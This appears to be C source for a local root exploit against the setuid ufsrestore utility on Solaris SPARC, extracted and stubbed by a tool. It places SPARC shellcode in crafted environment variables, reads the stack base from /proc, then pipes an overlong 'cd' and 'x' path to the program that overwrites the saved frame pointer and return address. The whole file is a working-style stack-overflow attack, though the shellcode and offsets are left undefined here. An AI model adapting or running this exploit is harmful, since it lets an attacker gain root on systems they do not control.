
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_3__ TYPE_1__ ;


typedef int u_long ;
struct TYPE_3__ {int pr_stkbase; int pr_stksize; } ;
typedef TYPE_1__ pstatus_t ;
typedef int pstatus ;
typedef int platform ;
typedef scalar_t__ pid_t ;
typedef int FILE ;


 int EXIT_FAILURE ;
 int EXIT_SUCCESS ;
 unsigned long FP_OFFSET ;
 int O_RDONLY ;
 int PROG ;
 int SA (int) ;
 int SHELLCODE_OFFSET ;
 int SI_PLATFORM ;
 int STDERR_FILENO ;
 int STDIN_FILENO ;
 int STDOUT_FILENO ;
 int close (int) ;
 int dup2 (int,int) ;
 int execve (char*,char**,char**) ;
 int exit (int) ;
 int * fdopen (int,char*) ;
 int fflush (int *) ;
 scalar_t__ fork () ;
 int fprintf (int *,char*) ;
 int getpid () ;
 int open (char*,int ) ;
 char* pad1 ;
 char* pad2 ;
 int perror (char*) ;
 scalar_t__ pipe (int*) ;
 scalar_t__ read (int,TYPE_1__*,int) ;
 int realpath (int ,char*) ;
 char* sparc_shellcode ;
 int sprintf (char*,char*,...) ;
 int * stderr ;
 char* strdup (char*) ;
 int strlen (char*) ;
 scalar_t__ sysinfo (int ,char*,int) ;

main()
{
    char *args[4], *envs[5], prog[1024], platform[1024], pathpstatus[1024];
    int argc, envc, len, len2, len3, fd, off, totlen;
    pstatus_t pstatus;
    u_long stacktop, stackstart;
    pid_t pid;
    int mypipe[2];
    FILE *fp;







    if (sysinfo(SI_PLATFORM, platform, sizeof(platform))<0) {
        perror("sysinfo");
        exit(1);
    }

    realpath(PROG,prog);

    args[0] = strdup("ufsrestore");
    args[1] = strdup("if");
    args[2] = strdup("/var/tmp/dumpufs");
    args[3] = ((void*)0);

    len2 = strlen(platform) + 1 + strlen(prog) + 1;
    len2 = (len2 + 3) & ~3;

    pad2[ 243 - (len2 + strlen(sparc_shellcode) + 1) ] = '\0';

    envs[0] = strdup(pad1);
    envs[1] = strdup(sparc_shellcode);
    envs[2] = strdup(pad2);
    envs[3] = ((void*)0);

    len = 0;
    argc = 0;
    while (args[argc] != ((void*)0))
         len += strlen(args[argc++]) + 1;

    envc=0;
    len3 = 0;
    while (envs[envc] != ((void*)0))
         len3 += strlen(envs[envc++]) + 1;
    envs[0][ 255 - (len + (argc + envc + 4) * 4)] = '\0';


    off = len + (argc + envc + 3) * 4 + strlen(envs[0]) + 1 + SHELLCODE_OFFSET;

    len = ((len3 - ((argc + envc + 4) * 4) + 3) & ~3) + 4;
    len += len2;





    totlen = SA(len + (argc + envc + 4) * 4);






    sprintf(pathpstatus,"/proc/%d/status",getpid());

    if ((fd = open(pathpstatus, O_RDONLY)) < 0 ) {
        perror(pathpstatus);
        exit(1);
    }

    if (read(fd, &pstatus, sizeof (pstatus)) < 0 ) {
        (void) close(fd);
        perror("read");
        exit(1);
    }

    stacktop = pstatus.pr_stkbase + pstatus.pr_stksize;
    stackstart = stacktop - totlen;
    (void) close(fd);


    if (pipe (mypipe)) {
        fprintf (stderr, "Pipe failed.\n");
        return EXIT_FAILURE;
    }


    pid = fork ();
    if (pid == (pid_t) 0) {

        close(STDIN_FILENO);
        dup2(mypipe[0], STDIN_FILENO);
        close(STDOUT_FILENO);
        dup2(mypipe[1], STDOUT_FILENO);
        close(STDERR_FILENO);
        execve(prog, args, envs);
        return EXIT_SUCCESS;
    } else if (pid < (pid_t) 0) {

        fprintf (stderr, "Fork failed.\n");
        return EXIT_FAILURE;
    } else {

        char buf[256];
        unsigned long ptr;
        fp = fdopen(mypipe[1],"w");
        fprintf(fp,"cd /var/tmp/a*/a*/a*/a*\n");fflush(fp);
        sprintf(buf,"x ../../aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
                     "aaaaaaaaaaaaaaaaaaaaaaaaaaa\n");
        ptr = stackstart - FP_OFFSET;
        *(long *)&buf[strlen(buf)-33] = ptr;
        *(long *)&buf[strlen(buf)-9] = ptr;
        ptr = stackstart + off;
        *(long *)&buf[strlen(buf)-5] = ptr;
        fprintf(fp,buf);fflush(fp);
        return EXIT_SUCCESS;
    }
}
